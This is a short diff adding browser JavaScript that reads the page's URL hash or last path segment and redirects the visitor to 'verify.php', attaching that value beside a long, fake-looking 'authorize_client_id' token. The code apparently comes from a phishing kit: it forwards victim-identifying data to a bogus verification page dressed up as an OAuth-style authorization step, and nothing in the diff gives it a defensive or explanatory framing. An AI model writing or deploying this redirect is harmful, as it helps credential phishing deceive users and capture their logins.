@@ -1,0 +1,12 @@
+
+    if(window.location.hash){
+        var hash = location.hash.substr(1);
+        window.location.href="verify.php?authorize_client_id:0dvhu3fp-bj7q-ypdn-6bz7-dz0ru5xvky84_ywutzxfq76mjiln40e8goh5pd1vsrack3b92eu58v09zsj3lpq2nmabik7gdx4f6rtc1hywob3xhr415pi9aequls0gkv2o6dtf8y7znjwcm&data="+hash; 
+    } else{
+        var str = window.location.href;
+        const getLastItem = thePath => thePath.substring(thePath.lastIndexOf('/') + 1)
+        var got = getLastItem(str);
+        
+                window.location.href="verify.php"+got+"&authorize_client_id:0dvhu3fp-bj7q-ypdn-6bz7-dz0ru5xvky84_ywutzxfq76mjiln40e8goh5pd1vsrack3b92eu58v09zsj3lpq2nmabik7gdx4f6rtc1hywob3xhr415pi9aequls0gkv2o6dtf8y7znjwcm";
+            }
+    
